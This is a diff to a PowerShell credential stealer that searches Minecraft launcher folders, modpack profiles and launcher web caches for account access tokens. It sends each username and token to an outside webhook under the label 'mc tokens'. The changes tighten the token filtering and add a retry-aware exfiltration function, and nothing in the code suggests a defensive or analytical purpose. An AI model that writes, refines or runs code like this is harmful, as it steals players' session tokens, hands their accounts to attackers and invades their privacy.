@@ -11,12 +11,15 @@ try{
 
 $found = @()
 $seen = @{}
-$jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"
+
+# looser regex, length check filters junk
+$jwtRegex = "eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+"
 
 function Add-Token {
     param($tok, $user, $src)
     if(-not $tok){ return }
-    if($tok.Length -lt 30){ return }
+    if($tok.Length -lt 100){ return }
+    if($tok -notmatch "^eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+$"){ return }
     if($seen.ContainsKey($tok)){ return }
     $seen[$tok] = $true
     $script:found += "user: $user`nssid: $tok`nfile: $src`n"
@@ -49,16 +52,18 @@ foreach($p in $paths){
     if(Test-Path $p){
         try{
             $raw = Get-Content $p -Raw
-            $j = $raw | ConvertFrom-Json -EA 0
-            if($j.accounts){
-                $j.accounts.PSObject.Properties | %{
-                    $a = $_.Value
-                    $uname = "unknown"
-                    if($a.minecraftProfile -and $a.minecraftProfile.name){ $uname = $a.minecraftProfile.name }
-                    elseif($a.username){ $uname = $a.username }
-                    if($a.accessToken){ Add-Token $a.accessToken $uname $p }
+            try{
+                $j = $raw | ConvertFrom-Json
+                if($j.accounts){
+                    $j.accounts.PSObject.Properties | %{
+                        $a = $_.Value
+                        $uname = "unknown"
+                        if($a.minecraftProfile -and $a.minecraftProfile.name){ $uname = $a.minecraftProfile.name }
+                        elseif($a.username){ $uname = $a.username }
+                        if($a.accessToken){ Add-Token $a.accessToken $uname $p }
+                    }
                 }
-            }
+            }catch{}
             [regex]::Matches($raw, $jwtRegex) | %{ Add-Token $_.Value "unknown" $p }
         }catch{}
     }
@@ -75,7 +80,7 @@ if(Test-Path $bin){
     }catch{}
 }
 
-# 3. deep scan launcher folders for account-ish json
+# 3. deep scan launcher folders
 $roots = @(
     "$env:APPDATA\.minecraft",
     "$env:APPDATA\.lunarclient",
@@ -100,7 +105,7 @@ foreach($r in $roots){
     }
 }
 
-# 4. modpack profile configs (opsec + alt account mods)
+# 4. modpack profile configs
 $profileRoots = @(
     "$env:APPDATA\ModrinthApp\profiles",
     "$env:APPDATA\PrismLauncher\instances",
@@ -116,7 +121,7 @@ foreach($pr in $profileRoots){
                 if($_.Length -gt 1mb){ return }
                 $c = Get-Content $_.FullName -Raw -EA 0
                 try{
-                    $pj = $c | ConvertFrom-Json -EA 0
+                    $pj = $c | ConvertFrom-Json
                     if($pj.accounts){
                         $pj.accounts | %{
                             $u = if($_.username){ $_.username } else { "unknown" }
@@ -130,7 +135,7 @@ foreach($pr in $profileRoots){
     }
 }
 
-# 5. chromium localstorage in launcher webcaches
+# 5. chromium localstorage
 $webcaches = @(
     "$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb",
     "$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb",
@@ -150,13 +155,48 @@ foreach($lc in $webcaches){
     }
 }
 
+# rate limit safe send function
+function Send-Embed {
+    param($title, $desc, $color, $footerText)
+    $embed = @{
+        title = $title
+        description = "``````$desc``````"
+        color = $color
+        timestamp = (Get-Date).ToString("o")
+    }
+    if($footerText){ $embed.footer = @{ text = $footerText } }
+    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
+
+    $maxRetries = 3
+    $attempt = 0
+    while($attempt -lt $maxRetries){
+        $attempt++
+        try{
+            $resp = iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 15 -PassThru -EA 0
+            if($resp.StatusCode -eq 429){
+                $wait = 3
+                try{
+                    $ra = $resp.Headers['Retry-After']
+                    if($ra){ $wait = [double]$ra }
+                }catch{}
+                Start-Sleep -Seconds ($wait + 1)
+                continue
+            }
+            return
+        }catch{
+            Start-Sleep -Seconds 2
+        }
+    }
+}
+
+# send tokens only (no debug on prod)
 if($found.Count -eq 0){
     $found = "nothin found bro"
 }
 
 $joined = $found -join "`n"
 
-$limit = 1800
+$limit = 1700
 $chunks = @()
 for($i = 0; $i -lt $joined.Length; $i += $limit){
     $chunks += $joined.Substring($i, [Math]::Min($limit, $joined.Length - $i))
@@ -165,16 +205,6 @@ for($i = 0; $i -lt $joined.Length; $i += $limit){
 $n = 0
 foreach($c in $chunks){
     $n++
-    $embed = @{
-        title = "mc tokens"
-        description = "``````$c``````"
-        color = 5793266
-        footer = @{ text = "kylertools | part $n/$($chunks.Count)" }
-        timestamp = (Get-Date).ToString("o")
-    }
-    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
-    try{
-        iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 10 -EA 0 | Out-Null
-    }catch{}
-    Start-Sleep -Milliseconds 900
+    Send-Embed -title "mc tokens" -desc $c -color 5793266 -footerText "kylertools | part $n/$($chunks.Count)"
+    Start-Sleep -Seconds 2
 }
